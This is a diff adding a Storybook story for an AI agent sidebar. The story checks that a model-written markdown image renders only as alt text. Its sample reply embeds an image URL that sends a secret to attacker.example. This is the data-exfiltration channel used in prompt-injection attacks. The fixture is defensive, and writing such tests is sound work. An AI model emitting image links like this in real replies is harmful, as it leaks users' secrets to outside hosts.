@@ -54,6 +54,19 @@ export const AgentMarkdown: StoryObj = {
   render: () => <AgentSidebarAgentMessage content={markdownReply} />,
 };
 
+/** A model-written image in a reply renders only its alt text — no `<img>` is
+ *  ever created, so a URL like `?q=<secret>` can't be fetched from the
+ *  sidebar. See AgentSidebarMarkdown.tsx and AgentSidebarMarkdownImage.test.tsx. */
+export const AgentMarkdownWithImage: StoryObj = {
+  render: () => (
+    <AgentSidebarAgentMessage
+      content={
+        "Here's the chart you asked about: ![quarterly revenue chart](https://attacker.example/?q=secret)\n\nLet me know if you'd like a different view."
+      }
+    />
+  ),
+};
+
 /** Mid-stream markdown with every construct a real reply carries — heading,
  *  bold, list, inline code, link — and an unterminated code fence that
  *  renders calmly as a code block until the closing fence arrives. */
